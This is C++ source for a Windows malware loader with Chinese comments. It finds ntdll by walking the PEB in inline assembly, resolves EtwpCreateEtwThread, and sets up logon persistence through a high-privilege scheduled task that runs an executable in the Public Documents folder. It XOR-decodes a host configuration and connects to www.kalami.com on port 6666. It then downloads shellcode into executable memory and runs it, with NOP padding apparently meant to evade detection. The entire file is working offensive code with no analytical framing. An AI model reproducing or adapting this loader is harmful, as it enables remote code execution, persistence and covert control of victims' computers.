#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include<errhandlingapi.h>
#include"../../struct/info.h"
#include <comdef.h>
#include <wincred.h>
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "ws2_32.lib")

typedef HANDLE (WINAPI* pEtwpCreateEtwThread)(PVOID lpStartAddress, PVOID lpParameter);

static  MODIFY_DATA				modify_data ={"www.kalami.com",6666,{0,}};
//static  MODIFY_DATA				modify_data = { "192.168.0.5",6666,{0,} };
SOCKET									m_Socket = NULL;
ShellcodeStr*							m_ShellcodeStr = NULL;
pEtwpCreateEtwThread EtwpCreateEtwThread;

void Init()
{
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		exit(0);
	


	HMODULE ntdll = 0;
	HMODULE ket32 = 0;
	_asm {
		mov eax, fs: [0x18] ;
		mov eax, [eax + 0x30];
		mov eax, [eax + 0x0c];
		mov eax, [eax + 0x0c];
		mov eax, [eax];
		mov ebx, dword ptr[eax + 0x18];
		mov ntdll, ebx;
		mov eax, [eax];
		mov eax, dword ptr[eax + 0x18];
		mov ket32, eax;
	}
	char etw[] = { 'E','t','w','p','C','r','e','a','t','e','E','t','w','T','h','r','e','a','d',0 };
	EtwpCreateEtwThread = (pEtwpCreateEtwThread)GetProcAddress(ntdll, etw);

	ITaskService* pService;
	ITaskFolder* pRootFolder;
	ITaskDefinition* pTask;
	IRegistrationInfo* pRegInfo;
	IPrincipal* pPrincipal;
	ITaskSettings* pSettings;
	IIdleSettings* pIdleSettings;
	ITriggerCollection* pTriggerCollection;
	ITrigger* pTrigger;
	IActionCollection* pActionCollection;
	IAction* pAction;
	IExecAction* pExecAction;
	IRegisteredTask* pRegisteredTask;
	// 初始化 COM
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	//  设置 COM security levels.
	hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
	//  创建Task Service对象
	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
	//  连接到Task Service
	hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

	hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
	//首先创建任务定义对象，进行任务创建操作
	hr = pService->NewTask(0, &pTask);
	//接着设置注册信息
	hr = pTask->get_RegistrationInfo(&pRegInfo);
	char admin[] = { 'a','d','m','i','n','i','s','t','r','a','t','o','r',0 };
	//作者
	hr = pRegInfo->put_Author(_bstr_t(admin));

	//设置主体信息
	hr = pTask->get_Principal(&pPrincipal);
	//  设置登陆类型
	hr = pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
	// 设置运行权限
	hr = pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
	//设置任务相关信息
	hr = pTask->get_Settings(&pSettings);
	hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
	hr = pSettings->get_IdleSettings(&pIdleSettings);

	//创建触发器

	hr = pTask->get_Triggers(&pTriggerCollection);
	hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
	//设置执行操作
	hr = pTask->get_Actions(&pActionCollection);
	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
	char name[] = { 'C',':','\\','U','s','e','r','s','\\','P','u','b','l','i','c','\\','D','o','c','u','m','e','n','t','s','\\','0','0','0','0','.','e','x','e',0 };
	hr = pExecAction->put_Path(_bstr_t(name));
	//在ITaskFolder对象注册
	hr = pRootFolder->RegisterTaskDefinition(_bstr_t("yyy"), pTask, TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(L""), &pRegisteredTask);

}

void Run()
{
	HANDLE thread = EtwpCreateEtwThread(m_ShellcodeStr, m_ShellcodeStr);
	WaitForSingleObject(thread, -1);
}

DWORD WINAPI WorkThread(PVOID p)
{
	int len = 0;
	BYTE 	buff[10 * 1024] = { 0 };
	int nSize = 0;

	do
	{
		nSize = recv(m_Socket, (CHAR*)buff, sizeof(buff), 0);
		//接收出错跳出循环
		if (nSize <= 0)
		{
			exit(0);
		}

		//接受的数据拷贝到结构当中
		memcpy(((char*)m_ShellcodeStr) + len, buff, nSize);
		len += nSize;

		if (len == sizeof(ShellcodeStr))
		{
			memcpy(&m_ShellcodeStr->modify_data, &modify_data, sizeof(MODIFY_DATA));
		}

	} while (len != sizeof(ShellcodeStr));

	Run();

	return 0;
}

int main()
{
	__asm {
		nop
		nop
		nop
		nop
		nop
		nop
	}
	Init();
	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	__asm {
		nop
		nop
		nop
		nop
		nop
		nop
	}
	if (m_Socket != INVALID_SOCKET)
	{
		__asm {
			nop
			nop
			nop
			nop
			nop
			nop
		}
		m_ShellcodeStr = (ShellcodeStr*)VirtualAlloc(0,sizeof(ShellcodeStr), MEM_COMMIT| MEM_RESERVE,0x40);
		if (!m_ShellcodeStr)
			exit(0);

		for (size_t i = 0; i < sizeof(MODIFY_DATA); i++)
		{
			((PBYTE)&modify_data)[i] ^= 'a';
		}

		for (;;)
		{
			//域名转ip
			addrinfo* info = { 0 };
			if (getaddrinfo(modify_data.DNS, NULL, NULL, &info) != 0)
				break;
			__asm {
				nop
				nop
				nop
				nop
				nop
				nop
			}
			//填充连接结构
			sockaddr_in	 ClientAddr;
			ClientAddr = *((sockaddr_in*)info->ai_addr);
			ClientAddr.sin_port = htons(modify_data.Port);
			//开始连接
			if (connect(m_Socket, (SOCKADDR*)&ClientAddr, sizeof(ClientAddr)) != SOCKET_ERROR)
			{
				break;
			}
		}
		HANDLE thread = EtwpCreateEtwThread(WorkThread, &m_ShellcodeStr);
		__asm {
			nop
			nop
			nop
			nop
			nop
			nop
		}
		char name[] = { 'n','b','c','l','a','s','s',0 };
		int rt = send(m_Socket, name, sizeof(name), 0);
		if (rt <= 0)
		{
			exit(0);
		}
		__asm {
			nop
			nop
			nop
			nop
			nop
			nop
		}
		WaitForSingleObject(thread,-1);
	}

	return 0;
}


